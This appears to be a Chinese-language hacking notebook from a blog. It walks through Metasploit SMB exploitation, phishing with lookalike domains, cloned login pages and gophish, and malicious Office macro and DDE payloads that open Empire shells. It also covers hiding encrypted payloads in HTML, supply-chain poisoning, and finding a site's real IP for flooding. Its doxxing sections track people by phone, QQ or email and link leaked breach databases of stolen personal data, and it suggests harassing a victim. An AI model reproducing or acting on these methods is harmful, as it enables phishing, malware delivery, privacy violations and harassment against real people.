# 1. 启动msfservice postgresql startmsfconsole# 2.搜索相关漏洞search smb# 3. 进入该漏洞列表# show payloads可以查看需要设置哪些参数use auxiliary/scanner/smb/smb_ms17_010# 4.设置相关参数# show options可以查看需要设置哪些参数set RHOSTS 10.101.2.11#5. 执行利用漏洞run#其他常见命令# 查看当前系统getuid# 获取目标系统的shellshell
```

因为metasploit出现使得成为一名黑客的门槛降低了，这款工具将渗透过程变得简单和自动化。当一个漏洞出来时，在metaspolit会更新，你将可以用此工具做漏洞验证，当数月后漏洞修复了，那么此工具会公开漏洞利用的脚本。
![ 啊啊啊啊](https://img-blog.csdnimg.cn/20210510222731371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)




![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510223458722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210510225928292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**反弹**
用你如果要将msf用于实际外网（这里指非局域网）站点，需要做反弹于云服务器。
安装完msf之后确保你的云服务器能顺利执行msfconsole

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720150351190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 字典

### 制作

**pydictor**
生成简单字典、社工字典、合并整理多个字典
项目地址：https://github.com/LandGrey/pydictor
使用：

```bash
git clone https://www.github.com/landgrey/pydictor.gitcd pydictor/python pydictor.py # 查看社工字典python pydictor.py –sedb # 合并去重python pydictor.py -tool uniqbiner 你的字典文件夹
```

### fuzzy

国外fuzzy字典https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

# API漏洞

# 微信小程序漏洞

反编译方法https://www.cnblogs.com/xiaozi/p/15003105.html

# PC端软件

需要拦截数据包可用https://www.proxifier.com/download/或者你用其他全局代理，需破解。直接用win的全局代理不能很好的配合burpsuite，因为你会产生大量垃圾数据还可能拦截不到数据包


# APP漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715204256707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
APP-> WEB APP->其他 APP->逆向

## 抓包

 网站的框架被封装在APP中，因此你从网站下载的app入侵成功后很可能你同步拿下了网站的。以下方式获得的结果有很大的不同，你应该配合使用
 **获取信息方式1.burpsuite**
打开模拟器或者是你真实的在手机上进行操作，我打开了模拟器。
对wifi进行设置
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101333315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
设置wifi与自己本机wifi相同
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101546129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
手机抓包代理应该设置为本地真实ip而不是像抓网页端一样设置为127.0.0.1
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625101919134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

在burpsuite也做代理设置。burpsuite是一个专门抓web协议的数据流量软件。如果你在安卓模拟器随便打开一个app,当这个app涉及到请求网站时，这数据将会被抓取






 使用APP获取封装的网页，你需要利用好抓包工具burpsuite
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629214132940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

 在抓到相应的http链接后，你很可能遇到的情况是当你直接利用浏览器去访问请求的http时，无法得到你用app返回的数据包，你用浏览器返回的数据包很可能是个报错如403等界面。这时候你需要仔细检查你用APP发送的数据包与你用web发送的数据包异同点，将你的web发送的请求直接改成APP发送的数据包

**获取信息方式2.逆向编译工具**
漏了个大洞，一键提取，且加了反编译  
下载 https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw
提取码：k5se
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629212757948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


# 待补充：应急响应

# 社会工程学

社会工程学通常来说技术含量也不高，但有效。

## 以假乱真

### 准备

以下这些步骤是常见的钓鱼准备工作，挑选适用的为钓鱼做准备吧

#### 1. 购买相似域名

##### 购买谁家强

https://www.freenom.com/zh/index.html?lang=zh
用匿名邮箱注册吧
优点:

 - 免费
 - 三个月使用时长

缺点：

 - 很多域名无法注册

##### 买什么域名

###### 常见混淆方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/673d8a87adbf4bc7b56b104c8748446f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

或者用拉丁英文字母

###### 购买SEO高的域名

搜索过期域
https://www.expireddomains.net/
查看如何分类
http://www.fortiguard.com/webfilter
https://urlfiltering.paloaltonetworks.com/query/

###### 其他购买技巧

购买域名越旧被视为垃圾邮件概率就越小

###### 自动工具

https://github.com/elceef/dnstwist
[https://github.com/urbanadventurer/urlcrazy](https://github.com/urbanadventurer/urlcrazy)
https://dnstwist.it/
https://dnstwister.report/
https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/

其他策略：
当登录成功后索引到真实网站
收藏你的攻击网站

#### 2. 收集邮箱

本文其他部分有介绍，不重复

#### 3. 邮件内容

##### 主题

网络钓鱼的秘诀在于激发受害者的恐惧感或者紧迫感，有时也会向受害者描绘一些非常美好(甚至不太真实)的诱惑。如果是鱼叉式就自由发挥吧，以下列出了一些思路

****

教育/培养机构
科研人员：技术交流
学生：挂科名单
老师：

****

公司
上班人士：绩效、薪酬、放假通知、惩罚通告、公司福利活动
管理人员：
销售：谈合作
hr:简历

****

其他出发点：

- 新闻。疫情？
- 购物
- 软件更新
- 恐吓。我已经获得了你的邮箱密码，点击链接打钱！

****

##### 结尾

通过如招标文件获得手写签名，将手写签名用于后期钓鱼

##### 伪造网站

### 站点伪造

我学这个网站钓鱼是参考这篇博客，如果你觉得我遗漏了一些细节，请参考这篇博客完成实验[网站钓鱼攻击，图文请看这篇博客](https://www.freebuf.com/articles/web/253320.html)

在set>提示符中输入1（Social-Engineering Attacks）并按下回车。
现在选择Website Attack Vectors（选项2）。
从下面的菜单中，我们选择Credential Harvester Attack Method（选项3）。
选择Site Cloner（选项2）。
它会询问IP address for the POST back in Harvester/Tabnabbing。它的意思是收集到的证书打算发送到哪个 IP。这里，我们输入 Kali 主机在vboxnet0中的 IP 192.168.56.1。
下面，压脚询问要克隆的 URL，我们会从 vulnerable_vm 中克隆 Peruggia 的登录表单。输入http://192.168.56.102/peruggia/index. php?action=login。
现在会开始克隆，之后你会被询问是否 SET 要开启 Apache 服务器，让我们这次选择Yes，输入y并按下回车。在这里你可能需要生成一个短链来混淆是非，短链生成网站有很多，随便推荐[一个](http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group)

你想做得更多的话：

   登陆阿里云，进入dns控制台添加域名，添加并配置好记录，然后进入云服务器管理控制台，点击实例名进入。Xshell连接服务器（家庭版可），开启http服务。

- 把所有图像和资源移到本地（而不是从被克隆的站点调用）

### who am i

友套近乎，“他是我一个之前某某某游戏认识的，您能给我一下他的微信吗，好久没跟他聊了”

通过搜索公司的QQ群、钉钉群,伪装成员工获取敏感截图和没被公知的网站

## 钓鱼

一个钓鱼成功后，通常意味着他朋友的也可能成功


### 工具

以下工具选一
需求自动化选	gophish
你熟悉Ruby选	https://github.com/pentestgeek/phishing-frenzy
你熟悉python选	https://github.com/securestate/king-phisher

#### gophish

官方文档 http://getgophish.com/documentation/
gophish自带web面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的巨大的便捷
在功能上实现分块，令钓鱼初学者能够更好理解钓鱼工作各部分的原理及运用。
在正式入侵中，你需要
使用实在很简单，国内网上公开资料也很多，我就不重复了。请阅读并做个小实验https://blog.csdn.net/qq_42939527/article/details/107485116
或者，直接从网站中套用模板？https://github.com/L4bF0x/PhishingPretexts


### 钓鱼手段

DLL劫持
假冒加固工具
木马捆绑

#### 链接存放在

##### +开放重定向

如果网站有开放重定向只需要将重定向参数修改为外部站点。
如果用户访问 url?参数=example.com  ，它会重定向到 http://example.com/admin，这时候这种未经验证的参数的跳转网站你就可以伪造一个网站专门用来接待受害者

#### 宏 – Office

虽然是很老旧，但向受害者发送恶意的 Microsoft Office 文件仍然是久经考验的一种社会工程学攻击方法。那为什么 Office 文件非常适合作为恶意 payload 的载体呢？这是因为 Office 文件的默认设置是支持 VBA 代码所以允许 VBA 代码的代码执行。尽管最近这种方法已经很容易被杀毒软件检测到，但在经过混淆处理之后，在很多情况下仍然可以生效。


现在，每当有人打开你的文档时，他们都会收到安全警告并看到一个启用内容的按钮。 如果你可以诱导受害者点击“启用内容”的按钮，那么你的 PowerShell 脚本将会被执行，这会弹给你一个 Empire Shell 。

![在这里插入图片描述](https://img-blog.csdnimg.cn/5aa3f2c76321493bb5269e08a24289da.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


如前所述，宏文件方法是一种久经考验的旧方法，因此很多受害者已经对这种攻击有了一定的认识。利用 Office 文件的另一种思路是将我们的 payload 嵌入一个批处理文件(.bat)。但在较新版本的 Office 中，如果受害者双击 Word 文档中的 .bat 文件，对象则不会被执行。我们通常不得不试图诱导受害者使其将 .bat 文件移动到桌面并执行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/bb5d49c642b04e52b37b91252979c1b9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
我们可以用 LuckyStrike 来以更自动化的方式完成此操作。通过使用 LuckyStrike，我们可以在工作表中使用 Payload 创建 Excel 文档，甚至可以在 Excel 文档中存储完整的可执行文件（exe），这些文件可以用 ReflectivePE 来触发从而在内存中运行。阅读更多关于 LuckyStrike 的内容：
https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator

我想提到的用于 Office 文件执行的最后一个工具是 VBad。运行 VBad 时，必须在 Office 中启用宏，并在宏安全设置的下拉框中选择 “信任对 VBA 项目对象模型的访问” 选项。这会允许 VBad 运行 python 代码来更改并创建宏。

VBad 会严重混淆 MS Office 文档中的 payload。它还增加了加密功能，用假密钥来迷惑应急响应团队。最重要的是，它可以在第一次成功运行后销毁加密密钥（VBad 是一个一次性使用的恶意软件）。另一个特性是 VBad 也可以销毁对包含有效 payload 的模块的引用，以使其从 VBA 开发者工具中不可见。这使得分析和排除故障变得更加困难。因此，不仅很难去逆向，而且如果应急响应团队尝试分析执行的 Word 文档与原始文档，则所有密钥都将丢失。
![在这里插入图片描述](https://img-blog.csdnimg.cn/acf3c4e334fd4dcdb180b236b13260df.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 非宏的 Office 文件 —— DDE

 DDE 是全新易受攻击模块。杀毒软件或任何安全产品还尚未检测到它，因此这是获得我们初始入口点的好方法。 虽然现在有几种安全产品可以检测 DDE ，但在某些环境中它仍然可能是一种可行的攻击。

什么是 DDE？
“ Windows 提供了几种在不同的应用程序之间传输数据的方法。其中一种方法就是使用动态数据交换（DDE）协议。DDE 协议是一组消息和指南。它在共享数据的应用程序之间发送消息，并使用共享内存在应用程序之间交换数据。应用程序可以使用 DDE 协议进行一次性数据传输。并且应用程序也可以利用 DDE 协议来进行持续的数据交换，当新数据可用时候，应用程序可以通过持续的数据交换来彼此发送更新。”https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx

Sensepost 的团队做了一些很棒的研究，发现 MSExcel 和 MSWord 都暴露了 DDEExecute，并且可以在不使用宏的情况下创建代码执行。
在 Word 中：

转到“插入”选项卡 -> “快速部件” -> “字段”
选择 = 公式
右键单击：!Unexpected End of Formula 并选择 Toggle Field Codes
将 payload 替换为你的 payload：

```bash
DDEAUTO c:\windows\system32\cmd.exe “/k powershell.exe [empire payload here]”
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/004d1be057bf4efe8e590a995d5cdcff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
Empire 有一个 stager ，可以自动创建 Word 文件和关联的 PowerShell 脚本。 此 stager 可以通过以下方式配置：

usestager windows/macroless_msword
![在这里插入图片描述](https://img-blog.csdnimg.cn/548b1e740bed427b81fe538f57871489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
除了 0day 漏洞利用（例如 https://github.com/bhdresh/CVE-2017-0199 ）之外，Word 文档中是否还有其他任何能利用的特性呢？ 答案是肯定的。其中一个例子是 subdoc attacks。这些攻击导致受害者向网络上的攻击服务器发出 SMB 请求，以便收集 NTLM Auth Hash（NTLM 验证哈希）。 这种攻击并不是在所有场景里百分百生效，因为大多数公司现在阻止 SMB 相关端口连接外网。对于那些还未进行此种配置的公司，我们可以使用 subdoc_inector 攻击来利用这种错误配置。

#### 隐藏的加密 payload

作为红队队员，我们一直在寻求使用创造性的方法来构建我们的登陆页面，加密我们的 payload，并诱导用户点击运行。具有类似过程的两个不同工具是 EmbededInHTML 和 demiguise。

第一个工具 [EmbededInHTM](https://github.com/Arno0x/EmbedInHTML)，该工具的描述是“ 获取文件（任何类型的文件），加密它，并将其作为资源嵌入到 HTML 文件中，还包含模拟用户点击嵌入资源之后的自动下载进程。然后，当用户浏览 HTML 文件时，嵌入式文件即时解密，保存在临时文件夹中，然后将文件展示给用户。这一系列过程会让用户感觉该文件像是从远程站点下载来的。基于用户的浏览器和显示的文件类型，浏览器可以自动打开文件。”

```bash
cd /op/EmbedInHTMLpython embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/8a07ec8b11394556993f87988ae8da08.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
一旦受害者访问恶意站点，弹出的窗口会提示受害者在 Excel 中打开我们的.xll文件。不幸的是，对于最新版本的 Excel（除非配置错误），用户需要启用加载项来执行我们的 payload 。这就需要使用你在前面学到的社会工程学技巧了。

第二个工具是 demiguise，描述是“ 生成包含一个加密的 HTA 文件的 .html 文件。该工具的思路是，当你的目标访问该页面时，将获取其密钥并在浏览器中动态解密 HTA 然后将其直接推送给用户。这是一种隐匿技术，可以绕过由某些安全设备进行的的内容/文件类型的检查。但是此工具并不是为了创建优秀的 HTA 内容而设计的。在 HTA 内容方面还有其他工具/技术可以帮助你。demiguis 希望帮助用户的是:首先让你的 HTA 进入一个环境，并且（如果你使用环境键控）避免它被沙盒化。

```bash
python demiguise.py -k hello -c “cmd.exe /c ” -p Outlook.Application -o test.hta
```

#### 钓鱼 wifi

### 定向社工

> * 加好友
>   拿老师电话

>时间：2007-3-14 19：52 门卫部 道具：<<C++ Primer>> 冒称身份：学生李勇
>李勇：你好，我是C323班李勇。 
>门卫A：什么事？ 
>李勇：是这样的，昨天借了老师的一本书，但我忘记他的联系方式。 
>门卫B：哦，在桌子上压着，自已看。 
>李勇：我找找下。 
>李勇：唉，没找到，但我看见几个认识的老师的电话号码，我可以拿着拷贝一份吗？ 
>门卫A：不可以! 
>门卫B：你去学生科找找看吧。 
>李勇：好吧，谢谢。

**收集情报**
**获得公司ip，邮箱地址**对公司攻击时，找到销售邮箱，显示对产品感兴趣。当销售回邮件时可以分析邮件头真实ip，邮箱服务器地址
**域劫持** 当破解成功一位员工的密码时，请求管理员修改密码，这时候将会能对域进行劫持
**趋势**
网络安全防火墙被越来越多的公司重视，技术攻击可能会变得更难，但社会工程学利用人性做一些简单的工作就可以拿到更高机密的东西。社会工程学实施者就是所谓骗子，毕竟这不是什么有道德的事情，那下文就对这类人直称骗子。
**骗子特性**
低调，即便劣迹斑斑，却不会对任何人承认劣迹，就像蜜罐不愿意告诉苍蝇这里有危险。
十分重视表面看上去无利害的信息。
**生活中骗子**
如果骗子是在某行业混久了发现行业的漏洞，那么他是个不足够灵活的骗子。对于很多熟练如何行骗的人，都是先盯上某行发现其有大收益，接下来在对此内部人员调研更多信息。
**打探信息**
	对于打探更多的信息，这些信息收集通常都是敏感的，这时候你需要**给自己另一个身份**，比如你是记者、或在写一本调查书、或你是大学生需要得到一些信息、或你是内部员工或你是公司产品售后寻求调研。**打探信息第一步是**收集专业术语，如果收集信息遇到的人足够配合甚至可以问更多细节，否则在对方怀疑时就要停止问敏感信息。
	**如何知道对方是否产生怀疑**，试着问对方一个私人问题，比如：“你在这里工作多久了？”
	何时挂断电话，在问完关键问题时候，千万不要马上结束谈话，多问两三个关键问题，因为人最可能想起的是最后一个问题。



## 如何在本地查询

上面两个步骤的方法，只可查询的部分数据是因为数据总量非常大，不适合放在公网。其来源于 Telegram 电报群。它是放在 mega nz 网盘里面的，我也就把转存在自己的网盘里面了。在 MEGA NZ 网盘上分享由黑客盗取的数据库/密码是违反网盘存放规定的，若被举报，此处链接将不再补新。同时我也会失去账号以及源文件，但是对我损失不是很大，我再也不想拥有上帝之眼了。

```
https://mega.nz/folder/H54izYIIQ9zJBCd8uIpmqCAd7DGf3w
```


普通记事本文件是无法打开如此庞大的 txt 文件的，更别谈快速索引了。因此需要安装这款比较专业的软件。建议需要在超级固态硬盘的电脑上面使用，不然也是非常慢的。

```
https://www.emeditor.com/download/
```


其他一些社工库

http://shenkur/passd/

http://scnitpr/

http://cnseur/frumphp

开房记录：http://594skcm/
![在这里插入图片描述](https://img-blog.csdnimg.cn/202105061748366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

# 经验

## 知名网站

这与中小型网站渗透不太一样，中小型的可能以下方案/工具对目标帮助不大，而前面提到的很多常规工具又对他们的自定义WAF失效，所以我就增加了这一小节，希望能帮助到你一点吧。
扫这个网站向我们显示有关所发现的攻击，恶意网站或错误的信息 https://www.greynoise.io/viz/query

## IP伪造

通过互联网传输的数据首先被分成多个数据包，这些数据包独立传输并在最后重新组合。每个数据包都有一个 IP（互联网协议）标头，其中包含有关数据包的信息，包括源 IP 地址和目标 IP 地址。如果ip判定是从请求数据包进行判定的，这样就有可能存在伪造ip绕过的情况。
 **前端验证绕过**
以下方法已经快被淘汰
X-remote-IP:是远端IP，默认来自tcp连接客户端的Ip。可以说，它最准确，无法修改，只会得到直接连服务器客户端IP。如果对方通过代理服务器上网，就发现。获取到的是代理服务器IP了。
HTTP_CLIENT_IP 在高级匿名代理中，这个代表了代理服务器IP。
HTTP_X_FORWARDED_FOR = clientip,proxy1,proxy2其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。可以传入任意格式IP.这样结果会带来2大问题，其一，如果你设置某个页面，做IP限制。 对方可以容易修改IP不断请求该页面。 其二，这类数据你如果直接使用，将带来SQL注册，跨站攻击等漏洞;

自动化工具：burpsuite插件，只是改了一些请求头参数https://github.com/TheKingOfDuck/burpFakeIP
**TOR**
类似于分布式的 VPN。太慢了！！等你用成一个黄花菜都凉了

**选购代理**





### 攻破类似网站

当你攻破一个网站时，复制并百度其类似的目录结构（打开F12--》network，分析请求地址即可得到），就可以得到同源码搭建的网站。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628123827814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 如何攻击更多人

盗取开发者账号替换正规应用

发布知名应用仿冒品

重打包技术

第三方下载站点

通过共享资源社区

破解软件联盟组织

SEO优化方式劫持搜索引擎结果，引导大众下载恶意软件

攻击主流的软件包如PYPI，npm,Docker hub...投放大量相似拼写相似的

攻击者通过分析特定行业的知名软件、项目、抢对应域名、模仿官网。并进行汉化版下载链接

下载节点缓存、CDN  缓存、P2P  缓存、城域网缓存，被投毒污染
当前互联网体系下，硬件、软件、物联网 OT 设备的更新和数据分发，均依赖网络基础设施来承
载，当终端客户进行更新、下载时通过网络链路拉取，网络基础设施为了提升效率节省成文，会对一些资源进行缓存。攻击者可通过定向污染缓存来实现投毒，最终攻击终端用户。

软件、硬件产品在发展的过程中，为了提升产品体验、升级能力、修复 BUG 等，需要进行更新升级，供应商因此建设有配套的更新升级系统。黑客通过自身的攻击能力与掌握的漏洞，对供应商发起攻击与横向渗透，最中取得升级系统的控制权。利用窃取或伪造证书签名的软件更新，将恶意软件带进攻



### 溯源

这个技巧可以用在获得更多信息中，也可以用在反攻击中，即找出黑客是谁。
![在这里插入图片描述](https://img-blog.csdnimg.cn/202107011702168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 很强大的溯源工具

https://www.feiliuwl.cn/go/?url=http://qb-api.com/ 或者 https://qb-api.com   本站更换主域名为sgk.xyz！！网站不稳定。
18781615044
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616113445248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701170010902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


这个网站找到电话也可以 https://pig8.iculture.cc/


#### 已知名字

https://cn.linkedin.com/pub/dir?lastName=&firstName=名&trk=public_profile_people-search-bar_search-submit

#### 已知邮箱

**reg007/0xreg**。可以查看目标用户使用这个邮箱还注册了哪些网站
针对获得的这些信息做钓鱼

##### 获取电话号码

也可以先用reg007找到公开的注册网站。记住记住！！！有的网站可能会在在你没有准备下一步要发送密码时，就已经发送邮箱或者短信了，无疑会打草惊蛇，因此你需要先用你的账号密码进行测试。
通过“密码找回”获取手机号片段：

手动筛选电话号码可以参见这篇文章 https://mp.weixin.qq.com/s?__biz=MzI3NTExMDc0OQ==&mid=2247483802&idx=1&sn=e4317bcbc3e78ddf4c2715298ef197f2&scene=21#wechat_redirect

#### IP 定位

**IP**

1. 高精度 IP 定位：https://www.opengps.cn/Data/IP/LocHighAcc.aspx
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701231210744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


3. ipplus360 （IP 查询）：http://www.ipplus360.com/ip/
4. IP 信息查询：https://www.ipip.net/ip.html/
5. IP 地址查询在线工具：https://tool.lu/ip/

#### 已知电话号码

**查姓名**
可直接搜索支付宝
如果你不介意被对方发现，你可以直接通过支付宝转账，使用银行卡付款。
然后在你的银行卡客户端查询订单，订单详情的支付场所：XXX，会显示对方的全名
社交账户：（微信、QQ）等
注意：获取手机号如果自己查到的信息不多，直接上报钉钉群（利用共享渠道对其进行二次社工）

通过手机号查询他注册了哪些网站 http://www.newx007.com/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210615201723930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
等于获得了微信

##### 查询社交账号

**qq号**
接口地址：https://cxx.yun7.me/qqphone
返回格式：json
请求方式：get/post
请求示例：https://cxx.yun7.me/qqphone?phone=18888888888
请求参数说明：

返回示例：

{
	"status": 200,
	"message": "查询成功",
	"qq": "336699",
	"phone": "18888888888",
	"phonediqu": "福建省金门市移动"
}

#### 社交账号

##### 查询照片EXIF

https://www.gaitubao.com/exif

#### 已知QQ号

```
https://qq.pages.dev/
```

通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台
去腾讯\新浪微博搜索
通过微信搜索
查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)
通过说说、留言、日志找到其好友
加QQ钓鱼\共同好友\可能认识的人

##### 查询地址

https://www.iculture.cc/sg/pig=291

##### 查询电话号

qq点找回密码，其他与前文已知邮箱操作相同

你获得这个人电话了，要是想恶搞他就用他号码注册n个奇怪的网站，账号名还用实名。哈哈哈

##### 加被害者

钓鱼，查询对方上网地址 https://jingyan.baidu.com/article/6181c3e084fb7d152ef15385.html

#### 社工库

 http://site3.sjk.space/# 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
5e
5e指的是微博泄露的5亿微博uid与绑定手机相关联的数据
准确的5e是503925366条数据

8e
8e指的是QQ泄露的8亿QQ与初始绑定手机相关联的数据
准确的8e是有719806832条数据

16e
16e指的是整合的16亿数据
市面上没有纯16亿的QQ数据

如果声称有的100%是骗子
大概组成
4亿老密码和4亿QQ绑定的数据
8亿邮箱绑定的数据（包括手机和密码）

在线社工库
https://www.iculture.cc/pizzahut

## 绕过CDN

试图获取真实ip,对于中小型网站这是简单的，对于大型如百度、腾讯这是几乎不能成功的。
**有CDN吗**
小型网站可以尝试用nslookup来查询ip，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。
或者你通过多地ping看返回的ip是否一样来验证是不是有CDN。这个在站长之家的超级ping工具可以获得显示 http://ping.chinaz.com 使用此工具的时候注意你输入ww.XXX.com与XXX.com解析结果很可能是不同的。这取决于管理员对网站的设置。
如下是ww.XXX.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153333683.png)
和XXX.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153405923.png)
看看在后台的设置可以知道
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153456929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
但如果你用浏览器访问XXX.com，浏览器会自动给你加上www,导致你也许错误认为这两者对于真实的解析没有区别

**真实ip作用**
使用CDN的网站，如果你没有获得其真实的服务器ip地址，那么你对虚假地址的攻击只能是无效工作。虚假地址就像是对真实地址的一个缓存

1. 获取更多信息

> 信息量更多的扫描目录结果。我在测试某站点的一级域名目录与真实IP

3. 做攻击

>可洪水攻击、得到真实IP可以直接进行云WAF绕过；一般来说信息搜集的最主要最靠的步骤就是找出真实IP

**查询方法**
查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：
https://dnsdb.io/zh-cn/
https://x.threatbook.cn/
https://censys.io/ipv4?q=baidu.com
非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。
http://viewdns.info

同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。
https://site.ip138.com/

庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。
http://iphostinfo.com
注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。

